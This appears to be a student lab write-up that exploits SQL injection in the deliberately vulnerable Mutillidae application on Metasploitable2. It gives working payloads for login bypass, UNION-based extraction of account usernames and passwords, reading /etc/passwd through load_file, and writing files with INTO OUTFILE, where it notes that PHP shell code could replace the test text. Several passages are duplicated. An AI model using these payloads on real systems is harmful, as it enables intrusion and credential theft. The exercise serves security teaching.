# sqlinjection
Exploiting SQL Injection vulnerability

# AIM:
To exploit SQL Injection vulnerability using Multidae web application in Metasploitable2

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode


### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
SQL Injection is a sort of infusion assault that makes it conceivable to execute malicious SQL statements. These statements control a database server behind a web application. Assailants can utilize SQL Injection vulnerabilities to sidestep application safety efforts. They can circumvent authentication and authorization of a page or web application and recover the content of the whole SQL database. Identify IP address using ifconfig in Metasploitable2
![Screenshot 2024-04-28 204119](https://github.com/Narasimhan05/sqlinjection/assets/132819871/9b222e53-2fb5-4265-bfd5-0da55d77eef3)

Use the above ip address to access the apache webserver of Metasploitable2 from kali linux. In Kali Linux use the ip address in a web browser. 
![Screenshot 2024-04-28 204137](https://github.com/Narasimhan05/sqlinjection/assets/132819871/bddb8c0a-dce5-46a9-bd84-d33652832350)


Select Multidae from the menu listed as shown above. You will get the page as displayed below:

![Screenshot 2024-04-28 204231](https://github.com/Narasimhan05/sqlinjection/assets/132819871/2e9ee144-ccdf-4925-8e03-bd325d1d40b4)

Click on the link “Please register here”
![Screenshot 2024-04-28 204250](https://github.com/Narasimhan05/sqlinjection/assets/132819871/3d642445-a645-4fac-8f3b-f6237b5f5c3e)

Click on “Create Account” to display the following page:
![Screenshot 2024-04-28 204324](https://github.com/Narasimhan05/sqlinjection/assets/132819871/89ae561e-39eb-4880-9b86-2a12d19ef18a)

The login structure we will use in our examples is straightforward. It contains two input fields (username and password), which are both vulnerable. The back-end content creates a query to approve the username and secret key given by the client. Here is an outline of the page rationale:

($query = “SELECT * FROM users WHERE username=’$_POST[username]’ AND password=’$_POST[password]’“;). For the username put “ganesh” or “anything” and for the password put (anything’ or ‘1’=’1) or (admin’ or ‘1’=’1) then try to log in, and you’ll be presented with an admin login page.
![Screenshot 2024-04-28 204334](https://github.com/Narasimhan05/sqlinjection/assets/132819871/0c82b1fb-f9f5-42c6-a5e1-4ae2cb03eac6)

Click “Login”. The logged in page will show as below:
![Screenshot 2024-04-28 204348](https://github.com/Narasimhan05/sqlinjection/assets/132819871/b1c903ee-46c7-4862-8755-fa371003a12c)

##Bypassing login field

The username field is vulnerable. Put (ganesh’ #) or (ganesh’--) in the username field and hit “Enter” to log in. We use “#” or “--” to comment everything in the query sentence that comes after the username filed telling the database to disregard the password field: (SELECT * FROM users WHERE username=’admin’ # AND password=’ ‘). By using line commenting, the aggressor eliminates a part of the login condition and gains access. This technique will make the “WHERE” clause true only for one user; in this case, it is “ganesh.”

Now after logging out you will see the login page. In the login page give ganesh’ # . You can see the page now enters into the administrator page as before when giving the password.

![Screenshot 2024-04-28 204413](https://github.com/Narasimhan05/sqlinjection/assets/132819871/6562ead4-ae10-4b26-a8f3-be191340178b)

Click the login button and you will see it enter into the administrator page.
![Screenshot 2024-04-28 204431](https://github.com/Narasimhan05/sqlinjection/assets/132819871/5a60d64e-b60c-4a21-9645-950a183e7802)

Union-based SQL injection
UNION-based SQL injection assaults enable the analyzer to extract data from the database effectively. Since the “UNION” operator must be utilized if the two inquiries have precisely the same structure, the attacker must craft a “SELECT” statement like the first inquiry. we will be using the “User Info” page from Mutillidae to perform a Union-Based SQL injection attack. Go to “OWASP Top 10/A1 — Injection/SQLi — Extract-Data/User Info”

After logging out, Now choose the menu as shown below: img
![Screenshot 2024-04-28 204455](https://github.com/Narasimhan05/sqlinjection/assets/132819871/a06e9dce-d218-46e8-9fdc-b0f09a67f7cd)

From this point, all our attack vectors will be performed in the URL section of the page using the Union-Based technique.There are two different ways to discover how many columns are selected by the original query. The first is to infuse an “ORDER BY” statement indicating a column number. Given the column number specified is higher than the number of columns in the “SELECT” statement, an error will be returned.

![Screenshot 2024-04-28 204501](https://github.com/Narasimhan05/sqlinjection/assets/132819871/13ebc3ef-5505-47f7-b937-bb1445800326)

Since we do not know the number of columns, we start at 1. To find the exact amount of columns, the number is incremented until an error related to the “ORDER BY” clause is returned. In this example, we incremented it to 6 and received an error message, so it means that the number of columns is lower than 6.

The browser url of this info page need to be modified with the url as below:
http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27order%20by%206%23&password=&user-info-php-submit-button=View+Account+Details


After adding the order by 6 into the existing url , the following error statement will be obtained:
![Screenshot 2024-04-28 204513](https://github.com/Narasimhan05/sqlinjection/assets/132819871/5a305261-e65f-4d81-a380-463955ef7f6b)

When we ordered by 5, it worked and displayed some information. It means there are five columns that we can work with. Following screenshot shows that the url modified to have statement added with ordered by 5 replacing 6.
![Screenshot 2024-04-28 204542](https://github.com/Narasimhan05/sqlinjection/assets/132819871/a80f5266-b9aa-4f13-884b-9cc4dd209b49)

As it is having 5 columns the query worked fine and it provides the correct result
![Screenshot 2024-04-28 204551](https://github.com/Narasimhan05/sqlinjection/assets/132819871/c24225d4-98ff-4d39-885a-0cf6ebcf95fd)

Instead of using the "order by" option, let’s use the "union select" option and provide all five columns. Ex: (union select 1,2,3,4,5)
![Screenshot 2024-04-28 204559](https://github.com/Narasimhan05/sqlinjection/assets/132819871/b81167ee-6f0b-4a7c-b9dc-41c98cebba49)

As given in the screenshot below columns 2,3,4 are usable in which we can substitute any sql commands to extract necessary information.
![Screenshot 2024-04-28 204606](https://github.com/Narasimhan05/sqlinjection/assets/132819871/6b10f95a-3269-410e-8cfa-bcc896ed7e71)

Now we will substitute some few commands like database(), user(), version() to obtain the information regarding the database name, username and version of the database.

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,database(),user(),version(),5%23&password=&user-info-php-submit-button=View+Account+Details

![Screenshot 2024-04-28 204616](https://github.com/Narasimhan05/sqlinjection/assets/132819871/368498c8-276b-4de2-923c-ba928ef9c59a)
The url when executed, we obtain the necessary information about the database name owasp10, username as root@localhost and version as 5.0.51a-3ubuntu5. In MySQL, the table “information_schema.tables” contains all the metadata identified with table items. Below is listed the most useful information on this table.

Replace the query in the url with the following one: union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details
![Screenshot 2024-04-28 204625](https://github.com/Narasimhan05/sqlinjection/assets/132819871/7051f906-6fb9-497c-9aa4-bca824231b39)

The url once executed will retrieve table names from the “owasp 10” database. ##Extracting sensitive data such as passwords

When the attacker knows table names, he needs to discover what the column names are to extract data.

In MySQL, the table “information_schema.columns” gives data about columns in tables. One of the most useful columns to extract is called “column_name.”

Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns where table_name = ‘accounts’).

Here we are trying to extract column names from the “accounts” table.

The column names of the accounts is displayed below for the following url:
![Screenshot 2024-04-28 204634](https://github.com/Narasimhan05/sqlinjection/assets/132819871/a0e8c85f-033b-4b6a-97d1-70589a38ad82)

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details
![Screenshot 2024-04-28 205525](https://github.com/Narasimhan05/sqlinjection/assets/132819871/4f0461c6-325c-41a6-91e8-eb2b7e7f5232)

The url once executed will retrieve table names from the “owasp 10” database. ##Extracting sensitive data such as passwords

When the attacker knows table names, he needs to discover what the column names are to extract data.

In MySQL, the table “information_schema.columns” gives data about columns in tables. One of the most useful columns to extract is called “column_name.”

Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns where table_name = ‘accounts’).

Here we are trying to extract column names from the “accounts” table.
![Screenshot 2024-04-28 205530](https://github.com/Narasimhan05/sqlinjection/assets/132819871/f304a854-bca5-495f-b186-b20b91e7da6e)

The column names of the accounts is displayed below for the following url:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details
![Screenshot 2024-04-28 205535](https://github.com/Narasimhan05/sqlinjection/assets/132819871/89c0ac68-7f29-4a47-b6cd-e0f947f9a430)

Once we discovered all available column names, we can extract information from them by just adding those column names in our query sentence.

Ex: (union select 1,username,password,is_admin,5 from accounts).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=&user-info-php-submit-button=View+Account+Details
![alt text](VirtualBox_kali-linux-2024.1-virtualbox-amd64_28_04_2024_15_29_56.30.png)
Reading and writing files on the web-server
We can use the “LOAD_FILE()” operator to peruse the contents of any file contained within the web-server. We will typically check for the “/etc/password” file to see if we get lucky and scoop usernames and passwords to possible use in brute force attacks later.

Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details
![alt text](VirtualBox_kali-linux-2024.1-virtualbox-amd64_28_04_2024_15_29_56.31.png)
the “INTO_OUTFILE()” operator for all that they offer and attempt to root the objective server by transferring a shell-code through SQL infusion. we will write a “Hello World!” sentence and output it in the “/tmp/” directory as a “hello.txt” file. This “Hello World!” sentence can be substituted with any PHP shell-code that you want to execute in the target server. Ex: (union select null,’Hello World!’,null,null,null into outfile ‘/tmp/hello.txt’).

## RESULT:
The SQL Injection vulnerability is successfully exploited using the Multidae web application in Metasploitable2.
